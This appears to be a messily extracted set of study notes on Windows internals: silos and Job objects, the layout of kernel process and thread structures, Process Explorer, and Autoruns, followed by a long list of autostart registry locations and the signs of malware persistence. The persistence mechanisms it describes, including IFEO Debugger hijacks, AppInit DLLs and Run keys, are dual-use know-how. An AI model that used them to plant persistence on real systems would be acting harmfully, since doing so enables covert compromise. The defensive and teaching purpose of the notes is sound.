### threads might be waiting for. This allows interested parties (typically the Job

### creator) to monitor for limit violations and events that would affect the Job's

security (e.g., a new process being created or abnormally exiting). Any notification that targets the I/O Completion Port of a Job will be sent to the Job and all its ancestors (the Job itself does not have to have the I/O Completion Port for the notification to be sent to its ancestors). You can view unnamed Jobs with the kernel debugger command $ \rightarrow$ !job or dt nt!_ejob.
### Windows Containers (Server Silos)

### Windows Containers (Server Silos)—unlike Hyper-V Containers, which

### leverage a full virtualized environment—provide a second "instance" of all

User-Mode components while running on top of the same kernel and drivers.
### At the cost of some security, this provides a much more lightweight container

### environment which Microsoft Windows uses to implement containerization at

the OS level, similarly to Linux namespaces and cgroups but adapted for the NT Kernel.
### For simplicity, this is a Docker-like container environment on Windows, but

instead of full virtualization, it uses a deep isolation layer built into the Windows Kernel. Therefore, Windows Containers fill the same role as Docker but for
Windows-based apps (e.g., $\text{IIS}$ server, .NET, COM+ server, $\text{WCF} $).
### Containers share the same kernel but have an isolated User-Mode

### Environment. When you create a Silo (Sandboxed OS Session), inside that

### Silo, processes think they're in their own kernel, even though they share the

same host kernel. This isolation is handled by new kernel features, including: Namespace Virtualization
### Container Manager (Host Compute Service)

Silo Objects (Kernel Isolation Primitives) Silos, Nested Jobs, & Windows Containers
### Silo: The Isolation Boundary

### A Silo represents an isolation boundary in the Windows Kernel where each

### container gets its own logical OS environment (processes, registry, $

\text{LSA}$, networking, file system). Silos are a feature of Job Objects; in practice, a Silo is a hybrid Job Object.
### This results in the Silo Flag being set inside the $\text{EJOB}$ object, and the

### allocation of the SLS (Silo Local Storage) slots are triggered by the Job

c r e a t i o n . T h e C r e a t e J o b O b j e c t A P I , s p e c i f i c a l l y t h e S e t I n f o r m a t i o n J o b O b j e c t A P I , i s u s e d w i t h t h e JobObjectCreateSiloInformation class to initiate the creation of a Silo. A Silo can actually host two types of silos: App Silos and Server Silos.
### Server Silo Components

### The first element that defines a Server Silo is the existence of a custom

### Object Manager Namespace. All application-visible named objects (files,

### registry keys, events, mutexes, $\text{RPC}$ ports, and more) reside in a Root

Namespace, which allows applications to create, locate, and share these objects among themselves.
### The ability for a Server Silo to have its own Root Namespace means that all

### access to any named object can be controlled in three ways:

By creating a new copy of an existing object to provide an alternate view of it from within a Silo.
### By creating a brand-new object that only exists within that Silo (e.g.,

a containerized application creating an event). By creating a Symbolic Link to an existing object to provide direct access to it.
### This ability is then combined with the Virtual Machine Compute Service,

which interacts with additional components to provide a full isolation layer.
### The User-Mode isolation environment is provided by several key components:

A base Windows Image file ($\text{WIM}$) called Base OS. The $\text{NTDLL}$ library of the host OS. A sandboxed Virtual File System provided by the $\text{WCIFS.sys}
$ filter driver. A sandboxed Virtual Registry provided by the $\text{VReg}$ Kernel component.
### It's important to create additional isolation boundaries, which the kernel

provides to differentiate one silo from another: Micro-shared User data structures. Object Directory Namespace. API Set mapping based on ApiSetSchema.dll of the Base OS $ \text{WIM}$. Logon Session. $\text{ETW}$ Tracing and logger context.
### Silo Context Mechanism

### Each Server Silo gets its own copy of certain Kernel State which is stored and

tracked using the Silo Context Mechanism.
### A Silo Context refers to a storage slot inside the kernel that holds data

### specific to that container. When a new Server Silo (container) is created:

The kernel allocates a structure that holds all its per-silo data.
### This structure contains a Silo Local Storage ($\text{SLS}$) array,

similar to how processes create Thread Local Storage ($\text{TLS} $).
### Each slot index is assigned to a subsystem or driver, and this is the

same index across silos but points to different data pointers. Therefore, if a Network driver owns slot index 5, it always accesses slot index 5 in the $\text{SLS}$ array.
### The kernel API PsCreateSiloContext lets a component register or attach a silo-

specific data pointer: $\text{NTSTATUS PsCreateSiloContext}(\text{ULONG SiloIndex}, \text{PVOID ContextData})$. Silo Contexts make kernel-level multi-tenancy possible, acting as an internal data partitioning system.
### Root Host Silo

### What happens with the Network driver that runs on the Host itself? Windows

### defines a "Root Host Silo". Even though the host system ($\text{Session 0}$)

isn't a container, it pretends to be one and will be represented internally by the
### global structure PspHostSiloGlobals. Every time the kernel asks, "What's the

### current Silo context?" and finds a NULL, it just defaults to the Host's Silo

context. This ensures all code paths—both for containers and the Host—can use the same logic.
### Silo Monitors

### Silo Monitors is a notification or registration mechanism built into the

Windows kernel that lets drivers "subscribe" to Silo lifecycle events. Drivers
### can register as silo monitors using the following APIs: PsRegisterSiloMonitor,

PsStartSiloMonitor, and PsUnregisterSiloMonitor. When you register, the kernel immediately informs you of: All existing Silos. Any new silos created afterward. The driver can associate each silo's data with each Container through the Silo Context API. PsGetSiloMonitorContextSlot PsInsertSiloContext PsReplaceSiloContext
### PsAllocSiloContextSlot

### These APIs provide full lifecycle management and accessibility for third-

party internal drivers to integrate cleanly into the Windows Silo Container model.
### The Kernel Base: _EPROCESS and _ETHREAD

Every process and thread starts here — the NT executive level (in ntoskrnl.exe). _EPROCESS → Represents a process in the kernel. It stores core attributes like address space, handle table, access tokens, and thread lists. _ETHREAD → Represents a thread in the kernel. It links to its parent _EPROCESS, its TEB (Thread Environment Block) in user mode, and scheduling information. _EPROCESS and _ETHREAD are the canonical representations. These are managed by the NT kernel itself (the “nt!” world).
### The kernel scheduler, memory manager, I/O manager, and

security subsystems all operate on these.
### These objects live entirely in kernel space and exist for every

process — even console-only or service processes.
### The User-Mode Subsystem Layer: csrss.exe and _CSR_*

### Now, when a process starts, CSRSS (Client/Server Runtime Subsystem) —

the Windows user-mode subsystem manager — is notified. CSRSS maintains its own bookkeeping of processes and threads that are part of the Windows Subsystem.
### _CSR_PROCESS → Mirrors _EPROCESS from the kernel’s

perspective but in user mode inside csrss.exe. It holds info like console handles, process flags, API port handles, etc. _CSR_THREAD → Mirrors _ETHREAD in user mode. It tracks per-thread state, such as Win32 API message handling and
communication with csrss.exe.
### It creates _CSR_PROCESS and _CSR_THREAD objects only for

processes that register with the Windows subsystem, i.e., Win32 processes. These are user-mode mirror records of kernel processes/ threads. They’re not copies of the same memory — just bookkeeping that lets CSRSS handle: Console I/O Thread creation notifications Exception dispatching Exit handling Window message loops before GUI initialization.
### These are not duplicates, but parallel tracking structures — the

subsystem’s shadow copies of process/thread metadata. Every GUI-capable or Win32 process has a corresponding CSR_PROCESS and CSR_THREAD maintained by csrss.exe.
### The GUI and Graphics Layer: win32k.sys and _W32PROCESS /

## _W32Thread

When a process loads the Win32 API DLLs (user32.dll, gdi32.dll), it becomes a GUI process. That triggers win32k.sys (the kernel graphics and window manager) to attach graphical context.
### Win32k allocates _W32PROCESS and _W32THREAD structures in

kernel space and links them via pointers in _EPROCESS / _ETHREAD. _W32PROCESS → The kernel-mode structure in win32k.sys representing the process’s GUI state. Contains info like window station, desktop handles, GDI handle tables, etc. _W32THREAD → Represents a thread’s GUI state: message queue, input focus, window handles, etc. Those structures carry: Window station / desktop handles Message queues GDI handle tables Input focus and cursor state Synchronization with CSRSS’s message ports.
### These structures live in kernel space (win32k.sys) but are logically

associated with their _EPROCESS / _ETHREAD counterparts. So the _EPROCESS is always there.
Then: CSRSS attaches its _CSR_* objects when the process is managed by the Win32 subsystem. win32k.sys attaches its _W32* objects when GUI capability is initialized. The executive adds user-visible and subsystem logic; the kernel manages scheduling and synchronization. The _KPROCESS is the Process Control Block (PCB) embedded within
## _Eprocess,

and the _KTHREAD is the Thread Control Block (TCB) embedded within
## _Ethread.

They’re the “kernel dispatcher objects” nested inside the “executive objects.”
### The “K” in KPROCESS and KTHREAD

### The prefix K means Kernel Dispatcher Object — it’s the minimal,

scheduler-visible part of a process or thread. So: _KPROCESS = the kernel’s process control block (PCB) — what the scheduler and dispatcher care about. _KTHREAD = the kernel’s thread control block (TCB) — what represents a runnable entity on a CPU.
Relationship Between EPROCESS/ETHREAD and KPROCESS/ KTHREAD Windows uses a layered object model where executive objects “wrap” kernel dispatcher objects. ➤ _EPROCESS (Executive-level process)
### High-level OS abstraction for a process: address space, handle

tables, security token, object table, etc. Contains: +0x098 Pcb : _KPROCESS (offset varies by version) The Pcb field is literally a nested _KPROCESS struct — not a pointer but a full embedded structure. That means every process is built around a KPROCESS.
➤ _ETHREAD (Executive-level thread) High-level abstraction for a thread: start address, exit status, impersonation token, APC queues, etc. Contains: +0x000 Tcb : _KTHREAD (often the first field!) Same deal — the _KTHREAD is embedded in the _ETHREAD.
Why This Exists — “Layered Object” Design NT was designed as a layered kernel:
### Kernel layer → responsible for low-level primitives like

scheduling, context switching, synchronization (KPROCESS/KTHREAD, KSEMAPHORE, KEVENT, etc.)
### Executive layer → builds higher abstractions (EPROCESS/

ETHREAD, HANDLE tables, Object Manager support, I/O management). So: _KPROCESS and _KTHREAD are what the kernel dispatcher and scheduler see. _EPROCESS and _ETHREAD are what the executive and object manager see. The executive layer extends the kernel layer.
Control Flow Summary When a thread is scheduled:
### The dispatcher works purely with _KTHREAD structures — it

knows how to queue, prioritize, and context switch them. The _KTHREAD contains: Stack pointers (Kernel/User) Processor affinity Quantum, priority Scheduling state Wait lists, synchronization info The _EPROCESS (via _KPROCESS) holds process-wide scheduler parameters: Process base priority Default quantum Affinity mask
Ready queues
### Pointer to the directory table base (CR3 / page directory)

The rest of _EPROCESS — handles, tokens, image info — are managed by the executive, not the scheduler.
Each Structure = A Contiguous Memory “Region” (Like a Page in a Book)
### When Windows creates an executive object like _EPROCESS or _ETHREAD,

### it allocates a single contiguous memory block large enough to hold the

entire structure, including its embedded substructures (like _KPROCESS and _KTHREAD).
### That’s why, when you dump the memory around the address of

_EPROCESS, you’ll see field offsets that increase linearly, e.g.: nt!_EPROCESS +0x000 Pcb : _KPROCESS +0x2d0 ProcessLock : _EX_PUSH_LOCK +0x2d8 UniqueProcessId : Ptr64 Void +0x2e0 ActiveProcessLinks : _LIST_ENTRY ... So if _EPROCESS begins at (say) 0xFFFFA20A34C3B080, then: The embedded _KPROCESS lives starting at that same base (+0x000). The other fields follow sequentially in memory.
### It’s literally like a book chapter:

each substructure occupies its own segment within the continuous memory page for that object.
### Embedded vs. Pointer Fields

Here’s the key distinction that explains what you’re seeing: Field Type Example Memory Layout Description Embedded Structure _EPROCESS.Pcb : _KPROCESS Occupies part of the same contiguous memory No pointer indirection — data lives directly inside the parent object. Pointer to Another Structure _EPROCESS.ThreadListHead → _ETHREAD list Stores only the pointer (address) The actual target is elsewhere in memory.
So: _KPROCESS and _KTHREAD are embedded → contiguous in the parent’s memory. Most other objects (handle tables, tokens, etc.) are referenced by pointer → non-contiguous.
### Memory Spacing Example (Approximate Layout)

Let’s visualize this for a single process object: EPROCESS @ 0xFFFFA20A34C3B080
## ├── Kprocess (Pcb)

│ [0x0000 - 0x02CF] ├── ProcessLock │ [0x02D0 - 0x02D7] ├── UniqueProcessId │ [0x02D8 - 0x02DF] ├── ActiveProcessLinks │ [0x02E0 - 0x02EF] ├── Token │ [0x0350 - 0x0357] └── ... [continues up to ~0x065AB depending on version] Within that space: _KPROCESS is the first “chapter”. Each subsequent field or substructure occupies the next offsets. This is why you see them aligned like “pages” when viewing memory addresses.
The Same Applies to _ETHREAD ETHREAD @ 0xFFFFA20A36A2A080
## ├── Kthread (Tcb)

│ [0x0000 - 0x01FF]
├── CreateTime │ [0x0200 - 0x0207] ├── ExitTime │ [0x0208 - 0x020F] ├── Cid (Client ID) │ [0x0210 - 0x0217] └── ... So when you dump memory in WinDbg:
### 0: kd> dt nt!_ETHREAD <address>

…the offsets you see correspond directly to byte ranges in that contiguous allocation.
### Think of It Like a Nested Struct in C

If you wrote this in C, it would literally look like:
### typedef struct _EPROCESS {

### KPROCESS Pcb;             // occupies first bytes

EX_PUSH_LOCK ProcessLock; // follows directly in memory PVOID UniqueProcessId; LIST_ENTRY ActiveProcessLinks; // ...
## } Eprocess;

When this struct is allocated: The Pcb fields occupy the first region. Everything after it follows linearly.
### That’s why the debugger output appears like “book pages” — it’s the raw

in-memory layout of that composite structure. These structures live in non-paged pool or paged pool memory (depending on type). When the kernel creates a process/thread:
### EPROCESS / ETHREAD → Allocated from non-paged pool (since

kernel must access them at IRQL > PASSIVE_LEVEL).
### Internally, Windows uses ExAllocatePoolWithTag to allocate a

block of memory large enough to hold the structure. So it’s one block (like a “book”), not one page.
### When you dump the memory region (e.g., !pool, !poolfind, or memory

window view), you might see the structure’s members at offset-like addresses: _EPROCESS +0x000 Pcb : _KPROCESS +0x160 ProcessLock : _EX_PUSH_LOCK +0x168 UniqueProcessId : Ptr64 Void ... These offsets make it look like EPROCESS “contains” a _KPROCESS at +0x0. That’s correct — _EPROCESS literally embeds _KPROCESS as its first field. But these offsets don’t correspond to virtual pages. They are just field offsets within the same allocated block.
### Unlike Task Manager and all other process/processor monitoring tools, Process

### Explorer uses the clock cycle counter designed for thread run-time accounting

(described later in this chapter) instead of the clock interval timer, so you will see a significantly different view of CPU consumption using Process Explorer.
### This is because many threads run for such a short time that they are seldom (if

### ever) the currently running thread when the clock interval timer interrupt

### occurs. As a result, they are not charged for much of their CPU time, leading

### clock-based tools to perceive a CPU usage of 0 percent. On the other hand, the

### total number of clock cycles represents the actual number of processor cycles

### that each thread in the process accrued. It is independent of the clock interval

### timer’s resolution because the count is maintained internally by the processor

### at each cycle and updated by Windows at each interrupt entry . (A final

### accumulation is done before a context switch. Think of clock-based tools as a

### security camera taking one photo every second — if a thief runs in and out

### between photos, you’ll miss them. Process Explorer is like a motion sensor

that tracks every little movement — it knows exactly when and how much activity happened.
### AUTOSTARTS is the term I use to refer to software that runs automatically

### without being intentionally started by a user. This type of software includes

### drivers and services that start when the computer is booted; applications,

### utilities, and shell extensions that start when a user logs on; and browser

extensions that load when Internet Explorer is started. Over 200 locations in the
### file system and registry allow autostarts to be configured on x64 versions of

### Windows. These locations are often referred to as Autostart Extensibility

Points, or ASEPs. As malware has become more sophisticated and difficult to identify, its use of ASEPs
### has become more sophisticated as well, malware often leverages rootkits,

### which subvert the integrity of the operating system. Rootkits intercept and

### modify system calls, lying to software that uses documented system interfaces

### about the state of the system. Rootkits can hide the presence of registry keys

### and values, files and directories, processes, sockets, user accounts, and more,

### or they can make software believe something exists when it doesn’t. Some

### telltale signs that can point to malware:

### ■ Entries with a well-known publisher such as Microsoft that fail signature

verification. (Unfortunately, not all software published by Microsoft is signed.)
### ■ Entries with an image path pointing to a DLL or EXE file that is missing

Description or Publisher information (unless the target file is not found).
### ■ A common Windows component that is launched from an unusual or

### nonstandard location—for example, svchost.exe or another service launching

from C:\Windows or C:\Windows\SysWOW64 (instead of from System32) or from C:\System Volume Information.
### ■ Entries with names that can be mistaken for common Windows components,

such as those with slight misspellings—for example,“Isass.exe” with a capital “I”
### instead of a lower-case “L”, “scvhost.exe” instead of “svchost.exe,” or

“iexplorer.exe” with the extra “r” at the end.
### ■ Entries for which the file date and time of the launched program correspond

to when problems were first noticed or a breach is discovered to have occurred. ■ Disabling or deleting an entry, pressing F5 to refresh the display, and finding the entry still present and enabled. Malware will often monitor its ASEPs and put them back if they get removed.
### AUTORUNS utility to expose as many autostarts as we could identify, and to

### make it easy to disable or remove those autostarts. The information that

### Autoruns exposes can be discovered manually if you know where to look in the

### registry and file system. Autoruns automates that task, scanning a large

### number of ASEPs in a few seconds, verifying entries, and making it easier to

### identify entries with suspicious characteristics, such as the lack of a digital

### signature, or that are flagged as suspicious by VirusTotal. Windows tracks the

last write time for registry keys but not for individual registry values, the “last
### modified” time for a registry ASEP location will be for the key and might not

### reflect when a specific entry was changed. AutorunsC is a console-mode

### version of Autoruns that outputs results to its standard output. It is designed

primarily for use in scripts. Its purpose is data collection only: it cannot disable or delete any autostart entries. The command-line options are listed below.
### They let you capture all autostarts or just specific categories, verify digital

### signatures, query VirusTotal, omit Microsoft entries, specify a user account for

### which to capture autostarts or capture all user accounts’ autostarts, and output

### results as comma-separated or tab-separated values (CSV) or as XML. If you

### don’t specify any options, AutorunsC outputs just the Logon entries without

### signature verification and in an indented list format designed for human

### reading. To capture other ASEPs, add the –a option followed by one or more

letters indicating the ASEP categories of interest, or * to capture all ASEP categories.
### The Boot Execute are Windows native-mode executables that are started by the

### Session Manager (Smss.exe) during system boot. BootExecute typically

### includes tasks, such as hard-drive verification and repair (Autochk.exe), that

cannot be performed while Windows is running AppInit
### The idea behind AppInit DLLs surely seemed like a good idea to the software

### engineers who incorporated it into Windows NT 3.1. Specify one or more DLLs

### in the Appinit_Dlls registry key, and those DLLs will be loaded into every

### process that loads User32.dll (that is, virtually all user-mode Windows

processes). Well, what could go wrong with that?
### ■ The AppInit DLLs are loaded into the process during User32’s initialization—

that is, while its DllMain function is executing. Developers are explicitly told not
### to load other DLLs within a DllMain. It can lead to deadlocks and out-of-order

### loads, which can lead to application crashes. And yet here, the AppInit DLL

“feature” does exactly that. And yes, that has led to deadlock and application crashes.5
### ■ A DLL that automatically gets loaded into every process on the computer

### sounds like a winner if you are writing malware. Although AppInit has been used

in legitimate (but misguided) software, it is frequently used by malware.
### Because of these problems, AppInit DLLs are deprecated and disabled by

### default in Windows Vista and newer. For purposes of backward compatibility, it

### is possible to re-enable AppInit DLL functionality, but doing so is strongly

### discouraged. To ensure that AppInit DLLs have not been re-enabled, verify that

the LoadAppInit_DLLs DWORD value is 0 in HKLM\Software\Microsoft\Windows N T \ C u r r e n t V e r s i o n \ W i n d o w s a n d i n H K L M \ S o f t w a r e \ W o w 6 4 3 2 N o d e \ M i c r o s o f t \ W i n d o w s N T \ CurrentVersion\Windows. KnownDLLs
### KnownDLLs helps improve system performance by ensuring that all Windows

### processes use the same version of certain DLLs, rather than choose their own

### from various file locations. During startup, the Session Manager maps the DLLs

listed in HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
### into memory as named section objects. When a new process is loaded and

### needs to map these DLLs, it uses the existing sections rather than searching

### the file system for another version of the DLL. The Autoruns KnownDLLs tab

### should contain only verifiable Windows DLLs. On 64-bit versions of Windows,

### the KnownDLLs tab lists one ASEP, but file entries are duplicated for both 32-

bit and 64-bit versions of the DLLs, in directories specified by the DllDirectory
### and DllDirectory32 values in the registry key. Note that the Windows-On-

### Windows-64 (WOW64) support DLLs are present only in the System32

### directory and Autoruns will report “file not found” for the corresponding

SysWOW64 directory entries. This is normal.
### Image hijacks

### Image hijacks is the term I use for ASEPs that run a different program from the

one you specify and expect to be running. The Image Hijacks tab displays four
### types of these redirections:

### ■ exefile Changes to the association of the .exe or .cmd file types with an

### executable command. The file-association user interfaces in Windows have

### never exposed a way to change the association of the .exe or .cmd file types,

but they can be changed in the registry. Note that there are per-user and systemwide versions of these ASEPs.
### ■ htmlfile Changes to the association of the .htm or .html file types with an

### executable command. Some malware that hijacks these ASEPs can come into

play when you open an HTML file. Verify that the executable command is a legitimate browser.
### ■ Command Processor\Autorun A command line that is executed whenever a

### new Cmd.exe instance is launched. The command runs within the context of

### the new Cmd.exe in- stance. There is a per-user and systemwide variant, as

well as a separate version for the 32-bit Cmd.exe on 64-bit Windows.
### ■ Image File Execution Options (IFEO) Subkeys of this registry location (and its

### echo in the 64-bit versions of Windows) are used for a number of internal and

### undocumented purposes. One purpose for IFEO subkeys that has been

### documented is the ability to specify an alternate program to start whenever a

### particular application is launched. By creating a subkey named

### for the file name of the original program and a “Debugger” value within that key

### that specifies an executable path to an alternate program, the alternate

### program is started instead and receives the original program path and

### command line on its command line. The original purpose of this mechanism was

### for the alternate program to be a debugger and for the new process to be

### started by that debugger, rather than having a debugger attach to the process

### later, after its startup code had already run. However, there is no requirement

### that the alternate program actually be a debugger, nor that it even look at the

command line passed to it. In fact, this mechanism is how Process Explorer replaces Task Manager.
### The following lists the Logon ASEP locations that Autoruns inspects on a

### particular instance of an x64 version of Windows 10. The Startup directory in

the “all users” Start menu %ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\Startup
### The Startup directory in the user’s Start menu

%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup Per-user ASEPs under HKCU\Software HKCU\Software\Microsoft\Windows\CurrentVersion\Run HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce HKCU\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\ CurrentVersion\Run HKCU\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\
CurrentVersion\Runonce HKCU\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\ CurrentVersion\RunonceEx HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Load HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
### Per-user ASEPs under HKCU\Software—64-bit only

HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce Per-user ASEPs under HKCU\Software intended to be controlled through Group Policy HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\Shell HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logon HKCU\Software\Policies\Microsoft\Windows\System\Scripts\Logoff
### Systemwide ASEPs in the registry

HKLM\Software\Microsoft\Windows\CurrentVersion\Run HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
### HKLM\Software\Microsoft\Active Setup\Installed Components

HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\ CurrentVersion\Run HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\ CurrentVersion\Runonce HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\ CurrentVersion\RunonceEx
### H K L M \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s

NT\CurrentVersion\Winlogon\IconServiceLib
### H K L M \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s

NT\CurrentVersion\Winlogon\AlternateShells\AvailableShells HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\AppSetup HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Taskman HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\VmApplet HKLM\System\CurrentControlSet\Control\SafeBoot\AlternateShell H K L M \ S y s t e m \ C u r r e n t C o n t r o l S e t \ C o n t r o l \ T e r m i n a l Server\Wds\rdpwd\StartupPrograms HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP- Tcp\InitialProgram Systemwide ASEPs in the registry, intended to be controlled through Group Policy
HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Shell HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logon HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Logoff HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Startup HKLM\Software\Policies\Microsoft\Windows\System\Scripts\Shutdown H K L M \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ G r o u p Policy\Scripts\Startup H K L M \ S o f t w a r e \ M i c r o s o f t \ W i n d o w s \ C u r r e n t V e r s i o n \ G r o u p Policy\Scripts\Shutdown
### Systemwide ASEPs in the registry—64-bit only

HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx
### HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components

### Systemwide ActiveSync ASEPs in the registry

HKLM\Software\Microsoft\Windows CE Services\AutoStartOnConnect HKLM\Software\Microsoft\Windows CE Services\AutoStartOnDisconnect
### Systemwide ActiveSync ASEPs in the registry—64-bit only

H K L M \ S o f t w a r e \ W o w 6 4 3 2 N o d e \ M i c r o s o f t \ W i n d o w s C E Services\AutoStartOnConnect H K L M \ S o f t w a r e \ W o w 6 4 3 2 N o d e \ M i c r o s o f t \ W i n d o w s C E Services\AutoStartOnDisconnect Per-user ASEPs under HKCU\Software HKCU\Software\Classes\*\ShellEx\ContextMenuHandlers HKCU\Software\Classes\*\ShellEx\PropertySheetHandlers HKCU\Software\Classes\AllFileSystemObjects\ShellEx\ContextMenuHandlers HKCU\Software\Classes\AllFileSystemObjects\ShellEx\DragDropHandlers HKCU\Software\Classes\AllFileSystemObjects\ShellEx\PropertySheetHandlers H KC U \ S o f t wa re \C l a ss e s \C l s i d \ { A B 8 9 0 2 B 4 - 0 9 CA- 4 b b 6 - B 78 D - A8F59079A8D5}\Inprocserver32 HKCU\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers HKCU\Software\Classes\Directory\ShellEx\ContextMenuHandlers HKCU\Software\Classes\Directory\Shellex\CopyHookHandlers HKCU\Software\Classes\Directory\Shellex\DragDropHandlers HKCU\Software\Classes\Directory\Shellex\PropertySheetHandlers HKCU\Software\Classes\Drive\ShellEx\ContextMenuHandlers HKCU\Software\Classes\Folder\Shellex\ColumnHandlers HKCU\Software\Classes\Folder\ShellEx\ContextMenuHandlers HKCU\Software\Classes\Folder\ShellEx\DragDropHandlers HKCU\Software\Classes\Folder\ShellEx\ExtShellFolderViews HKCU\Software\Classes\Folder\ShellEx\PropertySheetHandlers HKCU\Software\Classes\Protocols\Filter HKCU\Software\Classes\Protocols\Handler HKCU\Software\Microsoft\Ctf\LangBarAddin HKCU\Software\Microsoft\Internet Explorer\Desktop\Components
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayId entifiers HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObject HKCU\Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoa HKLM\Software\Classes\*\ShellEx\ContextMenuHandlers HKLM\Software\Classes\*\ShellEx\PropertySheetHandlers HKLM\Software\Classes\AllFileSystemObjects\ShellEx\ContextMenuHandlers HKLM\Software\Classes\AllFileSystemObjects\ShellEx\DragDropHandlers HKLM\Software\Classes\AllFileSystemObjects\ShellEx\PropertySheetHandlers HKLM\Software\Classes\Directory\Background\ShellEx\ContextMenuHandlers HKLM\Software\Classes\Directory\ShellEx\ContextMenuHandlers HKLM\Software\Classes\Directory\Shellex\CopyHookHandlers HKLM\Software\Classes\Directory\Shellex\DragDropHandlers HKLM\Software\Classes\Directory\Shellex\PropertySheetHandlers HKLM\Software\Classes\Drive\ShellEx\ContextMenuHandlers HKLM\Software\Classes\Folder\Shellex\ColumnHandlers HKLM\Software\Classes\Folder\ShellEx\ContextMenuHandlers HKLM\Software\Classes\Folder\ShellEx\DragDropHandlers HKLM\Software\Classes\Folder\ShellEx\ExtShellFolderViews HKLM\Software\Classes\Folder\ShellEx\PropertySheetHandlers HKLM\Software\Classes\Protocols\Filter HKLM\Software\Classes\Protocols\Handler HKLM\Software\Microsoft\Ctf\LangBarAddin HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\SharedTaskSchedu ler HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellExecuteHooks HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellIconOverlayId entifiers HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\ShellServiceObject HKLM\Software\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLo
### Systemwide ASEPs in the registry—64-bit only

HKLM\Software\Wow6432Node\Classes\*\ShellEx\ContextMenuHandlers HKLM\Software\Wow6432Node\Classes\*\ShellEx\PropertySheetHandlers HKLM\Software\Wow6432Node\Classes\AllFileSystemObjects\ShellEx\Context
### MenuHandlers

HKLM\Software\Wow6432Node\Classes\AllFileSystemObjects\ShellEx\DragDro pHandlers HKLM\Software\Wow6432Node\Classes\AllFileSystemObjects\ShellEx\Property
### SheetHandlers

HKLM\Software\Wow6432Node\Classes\Directory\Background\ShellEx\Context
### MenuHandlers

HKLM\Software\Wow6432Node\Classes\Directory\ShellEx\ContextMenuHandler
HKLM\Software\Wow6432Node\Classes\Directory\Shellex\CopyHookHandlers HKLM\Software\Wow6432Node\Classes\Directory\Shellex\DragDropHandlers HKLM\Software\Wow6432Node\Classes\Directory\Shellex\PropertySheetHandl ers HKLM\Software\Wow6432Node\Classes\Drive\ShellEx\ContextMenuHandlers HKLM\Software\Wow6432Node\Classes\Folder\Shellex\ColumnHandlers HKLM\Software\Wow6432Node\Classes\Folder\ShellEx\ContextMenuHandlers HKLM\Software\Wow6432Node\Classes\Folder\ShellEx\DragDropHandlers HKLM\Software\Wow6432Node\Classes\Folder\ShellEx\ExtShellFolderViews HKLM\Software\Wow6432Node\Classes\Folder\ShellEx\PropertySheetHandlers HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Sh
### aredTaskScheduler

HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Sh
### ellExecuteHooks

HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Sh
### ellIconOverlayIdentifiers

HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Sh
### ellServiceObjects

HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\ShellServic
### eObjectDelayLoad

instance of an x64 version of Windows 10. Per-user ASEPs under HKCU\Software
### HKCU\Software\Microsoft\Internet Explorer\Explorer Bars

HKCU\Software\Microsoft\Internet Explorer\Extensions HKCU\Software\Microsoft\Internet Explorer\UrlSearchHooks
### Systemwide ASEPs in the registry

### HKLM\Software\Microsoft\Internet Explorer\Explorer Bars

